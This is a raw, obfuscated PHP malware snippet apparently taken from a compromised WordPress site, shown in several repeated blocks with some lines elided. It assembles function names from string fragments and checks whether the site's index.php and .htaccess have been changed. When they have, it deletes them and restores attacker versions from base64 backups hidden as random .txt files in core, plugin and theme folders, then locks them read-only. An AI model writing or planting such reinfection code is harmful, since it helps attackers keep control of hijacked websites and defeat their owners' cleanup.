...
$f_size = 'fil' . 'esi' . 'ze';
$f_exists = 'fil' . 'e_e' . 'xis' . 'ts';
$f_put_contents = 'fil' . 'e_p' . 'ut_' . 'con' . 'ten' . 'ts';
$f_get_contents = 'fil' . 'e_g' . 'et_' . 'con' . 'ten' . 'ts';
$ch = 'c' . 'h' . 'm' . 'o' . 'd';
$tou = 't' . 'o' . 'u' . 'c' . 'h';
$delete = 'unl' . 'ink';
$bs_dec = 'bas' . 'e6' . '4_de' . 'code';

$idx_path = $_SERVER['DOCUME' . 'NT_ROOT'] . '/ind' . 'ex.php';
$htc_path = $_SERVER['DOCUME' . 'NT_ROOT'] . '/.hta' . 'ccess';
$bk_idx_path = '/home/anxorennsqi4/public_html/wp-includes/js/jquery/ui/Qmq2onbs747BP5T.txt';
$bk_htc_path = '/home/anxorennsqi4/public_html/wp-includes/js/swfupload/5ixNonbs7474coy.txt';

if (call_user_func($f_exists, $bk_idx_path)) {
    if (!call_user_func($f_exists, $idx_path) or call_user_func($f_size, $idx_path) != 6510) {
        if (call_user_func($f_exists, $bk_idx_path)) {
            @call_user_func($ch, $idx_path, 438);
            @call_user_func($delete, $idx_path);
            @call_user_func($f_put_contents, $idx_path, call_user_func($bs_dec, call_user_func($f_get_contents, $bk_idx_path)));
            @call_user_func($ch, $idx_path, 292);
        }
    }
}

if (call_user_func($f_exists, $bk_htc_path)) {
    if (!call_user_func($f_exists, $htc_path) or call_user_func($f_size, $htc_path) != 204) {
        if (call_user_func($f_exists, $bk_htc_path)) {
            @call_user_func($ch, $htc_path, 438);
            @call_user_func($delete, $htc_path);
...
$idx_path = $_SERVER['DOCUME' . 'NT_ROOT'] . '/ind' . 'ex.php';
$htc_path = $_SERVER['DOCUME' . 'NT_ROOT'] . '/.hta' . 'ccess';
$bk_idx_path = '/home/anxorennsqi4/public_html/wp-content/plugins/wp-editor-themes/includes/vKIMonbs747TBu4.txt';
$bk_htc_path = '/home/anxorennsqi4/public_html/wp-content/themes/izo/assets/css/VAZhonbs7474O35.txt';

if (call_user_func($f_exists, $bk_idx_path)) {
    if (!call_user_func($f_exists, $idx_path) or call_user_func($f_size, $idx_path) != 4200) {
        if (call_user_func($f_exists, $bk_idx_path)) {
            @call_user_func($ch, $idx_path, 438);
            @call_user_func($delete, $idx_path);
            @call_user_func($f_put_contents, $idx_path, call_user_func($bs_dec, call_user_func($f_get_contents, $bk_idx_path)));
...
$idx_path = $_SERVER['DOCUME' . 'NT_ROOT'] . '/ind' . 'ex.php';
$htc_path = $_SERVER['DOCUME' . 'NT_ROOT'] . '/.hta' . 'ccess';
$bk_idx_path = '/home/anxorennsqi4/public_html/wp-includes/blocks/buttons/4fvbonbs747pERp.txt';
$bk_htc_path = '/home/anxorennsqi4/public_html/wp-content/plugins/advanced-custom-fields-pro/includes/walkers/jR1fonbs747SU2g.txt';
